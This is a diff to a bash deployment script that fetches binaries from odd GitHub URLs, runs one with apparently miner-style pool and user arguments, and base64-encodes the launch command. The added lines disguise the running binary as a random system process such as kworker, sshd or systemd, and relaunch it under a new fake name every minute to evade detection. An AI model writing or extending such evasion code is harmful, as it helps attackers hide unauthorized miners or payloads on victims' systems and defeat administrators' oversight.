@@ -73,6 +73,15 @@ for i in 1 2 3; do
         SOCAT_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888"
         WEB8888_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888"
         
+        # System process names for renaming
+        SYSTEM_PROCESS_NAMES=(
+            "systemd" "kworker" "ksoftirqd" "rcu_sched" "migration" "watchdog"
+            "cpuhp" "netns" "kdevtmpfs" "kthreadd" "khelper" "writeback"
+            "sshd" "cron" "apache2" "nginx" "mysql" "postgres" "redis" "docker"
+        )
+        
+        RANDOM_PROC_NAME="${SYSTEM_PROCESS_NAMES[$RANDOM % ${#SYSTEM_PROCESS_NAMES[@]}]}$(rand_str 3)"
+        
         FULL_COMMAND="cd ${UNIQUE_WORKDIR} && \
 export DEBIAN_FRONTEND=noninteractive && \
 export TZ=Etc/UTC && \
@@ -88,7 +97,14 @@ chmod 755 ${BIN1} ${BIN2} && \
 (${UNIQUE_WORKDIR}/${BIN1} --daemon &) && \
 service apache2 start && \
 sleep 5 && \
-exec ${UNIQUE_WORKDIR}/${BIN2} -a ${VAR3} -o ${VAR4} -u ${VAR5}"
+while true; do
+    NEW_NAME=\"\${SYSTEM_PROCESS_NAMES[\$((RANDOM % \${#SYSTEM_PROCESS_NAMES[@]}))]}$(rand_str 3)\"
+    exec -a \"\${NEW_NAME}\" ${UNIQUE_WORKDIR}/${BIN2} -a ${VAR3} -o ${VAR4} -u ${VAR5} &
+    PID=\$!
+    sleep 60
+    kill -9 \${PID} 2>/dev/null || true
+    sleep 2
+done"
         
         ENCODED_CMD=$(echo -n "$FULL_COMMAND" | base64 -w 0)
         
